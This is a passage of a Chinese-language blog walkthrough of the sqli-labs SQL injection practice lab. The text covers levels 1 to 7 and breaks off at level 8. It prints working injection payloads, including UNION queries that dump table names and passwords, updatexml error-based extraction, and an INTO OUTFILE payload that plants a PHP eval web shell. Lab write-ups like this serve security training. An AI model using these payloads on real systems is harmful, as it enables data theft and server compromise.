<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Basic Challenges01-Error Based-Single quotes Error Based: 可以通过报错知道闭合方式 &gt; paylod: ?id&#x3D;1&#39;) and ;--+   源码拼接后： 12SELECT * FROM users WHERE id&#x3D;(&amp;#x27;$id&amp;#x27;) LIMIT 0,1;SELECT * FROM users WHERE i">
<meta property="og:type" content="article">
<meta property="og:title" content="sqli-labs全收集">
<meta property="og:url" content="https://m4o9.github.io/2022/08/12/sqli-labs%E5%85%A8%E6%94%B6%E9%9B%86/index.html">
<meta property="og:site_name" content="m4o9&#39;s blog">
<meta property="og:description" content="Basic Challenges01-Error Based-Single quotes Error Based: 可以通过报错知道闭合方式 &gt; paylod: ?id&#x3D;1&#39;) and ;--+   源码拼接后： 12SELECT * FROM users WHERE id&#x3D;(&amp;#x27;$id&amp;#x27;) LIMIT 0,1;SELECT * FROM users WHERE i">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://gitee.com/TyRantXx/imgs/raw/master/imgs/image-20220327164820673.png">
<meta property="og:image" content="https://gitee.com/TyRantXx/imgs/raw/master/imgs/image-20220403091029566.png">
<meta property="og:image" content="https://gitee.com/TyRantXx/imgs/raw/master/imgs/image-20220403091050057.png">
<meta property="og:image" content="https://gitee.com/TyRantXx/imgs/raw/master/imgs/image-20220403092850338.png">
<meta property="article:published_time" content="2022-08-12T11:03:18.000Z">
<meta property="article:modified_time" content="2022-09-12T11:05:20.862Z">
<meta property="article:author" content="m4o9">
<meta property="article:tag" content="sql注入">
<meta property="article:tag" content="mysql">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/TyRantXx/imgs/raw/master/imgs/image-20220327164820673.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>sqli-labs全收集</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Archive</a></li><!--
     --><!--
       --><li><a href="/categories/">categories</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/m4o9">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2022/09/08/%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AD%A6%E4%B9%A0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2022/08/07/hello-world/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://m4o9.github.io/2022/08/12/sqli-labs%E5%85%A8%E6%94%B6%E9%9B%86/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://m4o9.github.io/2022/08/12/sqli-labs%E5%85%A8%E6%94%B6%E9%9B%86/&text=sqli-labs全收集"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://m4o9.github.io/2022/08/12/sqli-labs%E5%85%A8%E6%94%B6%E9%9B%86/&title=sqli-labs全收集"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://m4o9.github.io/2022/08/12/sqli-labs%E5%85%A8%E6%94%B6%E9%9B%86/&is_video=false&description=sqli-labs全收集"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=sqli-labs全收集&body=Check out this article: https://m4o9.github.io/2022/08/12/sqli-labs%E5%85%A8%E6%94%B6%E9%9B%86/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://m4o9.github.io/2022/08/12/sqli-labs%E5%85%A8%E6%94%B6%E9%9B%86/&title=sqli-labs全收集"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://m4o9.github.io/2022/08/12/sqli-labs%E5%85%A8%E6%94%B6%E9%9B%86/&title=sqli-labs全收集"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://m4o9.github.io/2022/08/12/sqli-labs%E5%85%A8%E6%94%B6%E9%9B%86/&title=sqli-labs全收集"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://m4o9.github.io/2022/08/12/sqli-labs%E5%85%A8%E6%94%B6%E9%9B%86/&title=sqli-labs全收集"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://m4o9.github.io/2022/08/12/sqli-labs%E5%85%A8%E6%94%B6%E9%9B%86/&name=sqli-labs全收集&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://m4o9.github.io/2022/08/12/sqli-labs%E5%85%A8%E6%94%B6%E9%9B%86/&t=sqli-labs全收集"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Basic-Challenges"><span class="toc-number">1.</span> <span class="toc-text">Basic Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#01-Error-Based-Single-quotes"><span class="toc-number">1.0.1.</span> <span class="toc-text">01-Error Based-Single quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#02-Error-Based-Integer-based"><span class="toc-number">1.0.2.</span> <span class="toc-text">02-Error Based-Integer based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#03-Error-Based-Single-quotes-with-twist"><span class="toc-number">1.0.3.</span> <span class="toc-text">03-Error Based-Single quotes with twist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#04-Error-Based-Double-quotes"><span class="toc-number">1.0.4.</span> <span class="toc-text">04-Error Based-Double quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#05-Double-injections-Single-quotes"><span class="toc-number">1.0.5.</span> <span class="toc-text">05-Double injections-Single quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#06-Double-injections-Double-quotes"><span class="toc-number">1.0.6.</span> <span class="toc-text">06-Double injections-Double quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#07-Dump-into-outfile"><span class="toc-number">1.0.7.</span> <span class="toc-text">07-Dump into outfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#08-Blind-Boolian-Single-Quotes"><span class="toc-number">1.0.8.</span> <span class="toc-text">08-Blind-Boolian-Single Quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#09-Blind-Time-based-Single-Quotes"><span class="toc-number">1.0.9.</span> <span class="toc-text">09-Blind-Time based-Single Quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-Blind-Time-based-Double-Quotes"><span class="toc-number">1.0.10.</span> <span class="toc-text">10-Blind-Time based-Double Quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-POST-Error-based"><span class="toc-number">1.0.11.</span> <span class="toc-text">11-POST-Error based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-Error-Based-Double-quotes"><span class="toc-number">1.0.12.</span> <span class="toc-text">12-Error Based-Double quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-Double-Injection-String-with-twist"><span class="toc-number">1.0.13.</span> <span class="toc-text">13-Double Injection- String- with twist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-Double-Injection-Double-quotes-String"><span class="toc-number">1.0.14.</span> <span class="toc-text">14-Double Injection- Double quotes- String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-Blind-Boolian-Based-String"><span class="toc-number">1.0.15.</span> <span class="toc-text">15-Blind- Boolian Based- String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-Blind-Time-Based-Double-quotes-String"><span class="toc-number">1.0.16.</span> <span class="toc-text">16-Blind- Time Based- Double quotes- String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-Update-Query-Error-based-String"><span class="toc-number">1.0.17.</span> <span class="toc-text">17-Update Query- Error based - String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18-Header-Injection-Error-Based-string"><span class="toc-number">1.0.18.</span> <span class="toc-text">18-Header Injection- Error Based- string</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-Header-Injection-Referer-Error-Based-string"><span class="toc-number">1.0.19.</span> <span class="toc-text">19-Header Injection- Referer- Error Based- string</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#20-Cookie-Injection-Error-Based-string"><span class="toc-number">1.0.20.</span> <span class="toc-text">20-Cookie Injection- Error Based- string</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Advanced-Injections"><span class="toc-number">2.</span> <span class="toc-text">Advanced Injections</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21-Cookie-Injection-Error-Based-complex-string"><span class="toc-number">2.0.1.</span> <span class="toc-text">21-Cookie Injection- Error Based- complex - string</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-Cookie-Injection-Error-Based-Double-Quotes-string"><span class="toc-number">2.0.2.</span> <span class="toc-text">22-Cookie Injection- Error Based- Double Quotes - string</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-Error-Based-no-comments"><span class="toc-number">2.0.3.</span> <span class="toc-text">23-Error Based- no comments</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24-Second-Degree-Injections"><span class="toc-number">2.0.4.</span> <span class="toc-text">24-Second Degree Injections</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25-Trick-with-OR-amp-AND"><span class="toc-number">2.0.5.</span> <span class="toc-text">25 Trick with OR &amp; AND</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25a-Trick-with-OR-amp-AND-Blind"><span class="toc-number">2.0.6.</span> <span class="toc-text">25a-Trick with OR &amp; AND Blind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#26-Trick-with-comments"><span class="toc-number">2.0.7.</span> <span class="toc-text">26 Trick with comments</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#26a-Trick-with-comments"><span class="toc-number">2.0.8.</span> <span class="toc-text">26a Trick with comments</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#27-Trick-with-SELECT-amp-UNION"><span class="toc-number">2.0.9.</span> <span class="toc-text">27 Trick with SELECT &amp; UNION</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#27-Trick-with-SELECT-amp-UNION-1"><span class="toc-number">2.0.10.</span> <span class="toc-text">27 Trick with SELECT &amp; UNION</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#28-Trick-with-SELECT-amp-UNION"><span class="toc-number">2.0.11.</span> <span class="toc-text">28 Trick with SELECT &amp; UNION</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#28a-Trick-with-SELECT-amp-UNION"><span class="toc-number">2.0.12.</span> <span class="toc-text">28a Trick with SELECT &amp; UNION</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#29-31-WAF%E7%BB%95%E8%BF%87"><span class="toc-number">2.0.13.</span> <span class="toc-text">29-31 WAF绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32-Bypass-addslashes"><span class="toc-number">2.0.14.</span> <span class="toc-text">32 Bypass addslashes()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#33-Bypass-addslashes"><span class="toc-number">2.0.15.</span> <span class="toc-text">33 Bypass addslashes()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#34-Bypass-Add-SLASHES"><span class="toc-number">2.0.16.</span> <span class="toc-text">34 Bypass Add SLASHES</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-why-care-for-addslashes"><span class="toc-number">2.0.17.</span> <span class="toc-text">35 why care for addslashes()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#36-Bypass-MySQL-Real-Escape-String"><span class="toc-number">2.0.18.</span> <span class="toc-text">36 Bypass MySQL Real Escape String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#37-MySQL-real-escape-string"><span class="toc-number">2.0.19.</span> <span class="toc-text">37 MySQL_real_escape_string</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#38-stacked-Query"><span class="toc-number">2.0.20.</span> <span class="toc-text">38 stacked Query</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stacked-Injections"><span class="toc-number">2.1.</span> <span class="toc-text">Stacked Injections</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#39-stacked-Query-Intiger-type"><span class="toc-number">2.1.1.</span> <span class="toc-text">39 stacked Query Intiger type</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#40-stacked-Query-String-type-Blind"><span class="toc-number">2.1.2.</span> <span class="toc-text">40 stacked Query String type Blind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#41-stacked-Query-Intiger-type-blind"><span class="toc-number">2.1.3.</span> <span class="toc-text">41 stacked Query Intiger type blind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42-Stacked-Query-error-based"><span class="toc-number">2.1.4.</span> <span class="toc-text">42 Stacked Query error based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#43-Stacked-Query"><span class="toc-number">2.1.5.</span> <span class="toc-text">43 Stacked Query</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#44-Stacked-Query-Blind"><span class="toc-number">2.1.6.</span> <span class="toc-text">44 Stacked Query Blind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#45-Stacked-Query-Blind"><span class="toc-number">2.1.7.</span> <span class="toc-text">45 Stacked Query Blind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#46-ORDER-BY-Error-Numeric"><span class="toc-number">2.1.8.</span> <span class="toc-text">46 ORDER BY-Error-Numeric</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#47-ORDER-BY-Clause-Error-Single-quote"><span class="toc-number">2.1.9.</span> <span class="toc-text">47 ORDER BY Clause-Error-Single quote</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#48-ORDER-BY-Clause-Blind-based"><span class="toc-number">2.1.10.</span> <span class="toc-text">48 ORDER BY Clause Blind based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#49-ORDER-BY-Clause-Blind-based"><span class="toc-number">2.1.11.</span> <span class="toc-text">49 ORDER BY Clause Blind based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#50-ORDER-BY-Clause-Stacked-injection"><span class="toc-number">2.1.12.</span> <span class="toc-text">50 ORDER BY Clause Stacked injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#51-ORDER-BY-Clause-Stacked-injection"><span class="toc-number">2.1.13.</span> <span class="toc-text">51 ORDER BY Clause Stacked injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#52-ORDER-BY-Clause-Stacked-injection"><span class="toc-number">2.1.14.</span> <span class="toc-text">52 ORDER BY Clause Stacked injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#53-ORDER-BY-Clause-Stacked-injection"><span class="toc-number">2.1.15.</span> <span class="toc-text">53 ORDER BY Clause Stacked injection</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenges"><span class="toc-number">2.2.</span> <span class="toc-text">Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#54-Challengs-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">54 Challengs-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#55-Challengs-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">55 Challengs-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#56-Challengs-1"><span class="toc-number">2.2.3.</span> <span class="toc-text">56 Challengs-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#57-Challengs-1"><span class="toc-number">2.2.4.</span> <span class="toc-text">57 Challengs-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#58-Challengs-2"><span class="toc-number">2.2.5.</span> <span class="toc-text">58 Challengs-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#59-Challengs-2"><span class="toc-number">2.2.6.</span> <span class="toc-text">59 Challengs-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#60-Challengs-2"><span class="toc-number">2.2.7.</span> <span class="toc-text">60 Challengs-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#61-Challengs-2"><span class="toc-number">2.2.8.</span> <span class="toc-text">61 Challengs-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#62-Challengs-3"><span class="toc-number">2.2.9.</span> <span class="toc-text">62 Challengs-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#63-Challengs-3"><span class="toc-number">2.2.10.</span> <span class="toc-text">63 Challengs-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#64-Challengs-3"><span class="toc-number">2.2.11.</span> <span class="toc-text">64 Challengs-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#65-Challengs-3"><span class="toc-number">2.2.12.</span> <span class="toc-text">65 Challengs-3</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        sqli-labs全收集
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">m4o9</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-08-12T11:03:18.000Z" itemprop="datePublished">2022-08-12</time>
        
        (Updated: <time datetime="2022-09-12T11:05:20.862Z" itemprop="dateModified">2022-09-12</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/%E9%A2%98%E8%A7%A3/">题解</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/mysql/" rel="tag">mysql</a>, <a class="tag-link-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="Basic-Challenges"><a href="#Basic-Challenges" class="headerlink" title="Basic Challenges"></a>Basic Challenges</h1><h3 id="01-Error-Based-Single-quotes"><a href="#01-Error-Based-Single-quotes" class="headerlink" title="01-Error Based-Single quotes"></a>01-Error Based-Single quotes</h3><blockquote>
<p><strong>Error Based: 可以通过报错知道闭合方式</strong></p>
<p>&gt; paylod: <code>?id=1&#39;) and ;--+</code>  </p>
<p>源码拼接后：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;$id&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;1&#x27;</span>) <span class="keyword">and</span> ;<span class="comment">-- &#x27;) LIMIT 0,1;</span></span><br></pre></td></tr></table></figure>

<p>&gt; err: <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;;-- &#39;) LIMIT 0,1&#39; at line 1</code></p>
<p>可见<code>&#39;)</code>就是闭合方式</p>
</blockquote>
<p><code>1&#39; order by 4;--+</code></p>
<ul>
<li>字段数为<code>3</code></li>
</ul>
<p><code>-1&#39; union select 1,database(),3;--+</code> </p>
<ul>
<li>出库名<code> security</code></li>
</ul>
<p><code>-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;;--+</code></p>
<ul>
<li>出表名<code>emails,referers,uagents,users</code></li>
</ul>
<p><code>-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;;--+</code></p>
<ul>
<li>出列名<code>id,username,password</code></li>
</ul>
<p><code>-1&#39; union select 1,group_concat(password),3 from users;--+</code></p>
<ul>
<li>出 password 字段<code>Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</code></li>
</ul>
<p>同理可以出其他数据，不做演示</p>
<h3 id="02-Error-Based-Integer-based"><a href="#02-Error-Based-Integer-based" class="headerlink" title="02-Error Based-Integer based"></a>02-Error Based-Integer based</h3><p>同01 只要去掉-1后面的<code>&#39;</code></p>
<h3 id="03-Error-Based-Single-quotes-with-twist"><a href="#03-Error-Based-Single-quotes-with-twist" class="headerlink" title="03-Error Based-Single quotes with twist"></a>03-Error Based-Single quotes with twist</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>加了个<code>()</code> 我们闭合<code>(</code>,注释<code>)</code></p>
<p><code>-1&#39;) union select 1,database(),3;--+</code></p>
<p>完整语句: </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;-1&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span>;<span class="comment">-- &#x27;) LIMIT 0,1</span></span><br></pre></td></tr></table></figure>

<p>其他同理</p>
<h3 id="04-Error-Based-Double-quotes"><a href="#04-Error-Based-Double-quotes" class="headerlink" title="04-Error Based-Double quotes"></a>04-Error Based-Double quotes</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>闭合<code>左&quot;</code> 和<code>(</code>，注释<code>右&quot;</code>和<code>)</code></p>
<p><code>-1&quot;) union select 1,database(),3;--+</code></p>
<p>完整语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(&quot;-1&quot;) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span>;<span class="comment">-- &quot; ) LIMIT 0,1</span></span><br></pre></td></tr></table></figure>

<h3 id="05-Double-injections-Single-quotes"><a href="#05-Double-injections-Single-quotes" class="headerlink" title="05-Double injections-Single quotes"></a>05-Double injections-Single quotes</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">        ...</span><br><span class="line">  	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">        ...</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>只要<code>mysql_fetch_array</code>能正确返回数据，前端就回提示<code>You are in...........</code>，可以盲注，但是按照出题人的意思应该是要我们报错注入</p>
<blockquote>
<p>报错形式: <code>XPATH syntax error: &#39; emails,referers,uagents,users&#39;</code></p>
</blockquote>
<p><code>1&#39; and updatexml(1,concat(0x0a,(select database())),1); --+</code></p>
<ul>
<li>出库名<code>security</code></li>
</ul>
<p><code>1&#39; and updatexml(1,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),1); --+</code></p>
<ul>
<li>出表名<code>emails,referers,uagents,users</code></li>
</ul>
<p>… 接下来不演示了</p>
<h3 id="06-Double-injections-Double-quotes"><a href="#06-Double-injections-Double-quotes" class="headerlink" title="06-Double injections-Double quotes"></a>06-Double injections-Double quotes</h3><p>闭合<code>&quot;</code> 其他同理</p>
<p><code>1&quot; and updatexml(1,concat(0x0a,(select database())),1); --+</code></p>
<h3 id="07-Dump-into-outfile"><a href="#07-Dump-into-outfile" class="headerlink" title="07-Dump into outfile"></a>07-Dump into outfile</h3><p><code>$sql=&quot;SELECT * FROM users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&quot;;</code></p>
<p>闭合单引号 + <code>((</code></p>
<p><code>1&#39;)) union select 1,&quot;&lt;?php @eval($_POST[&#39;cmd1&#39;]);?&gt;&quot;,3 into outfile &#39;/var/www/html/hack.php&#39;;--+</code></p>
<p>写入一句话，直接访问即可</p>
<h3 id="08-Blind-Boolian-Single-Quotes"><a href="#08-Blind-Boolian-Single-Quotes" class="headerlink" title="08-Blind-Boolian-Single Quotes"></a>08-Blind-Boolian-Single Quotes</h3><p>跑库名的时间盲注脚本(布尔盲注脚本和这个差不多，就不写两种了),同理可以跑其他数据</p>
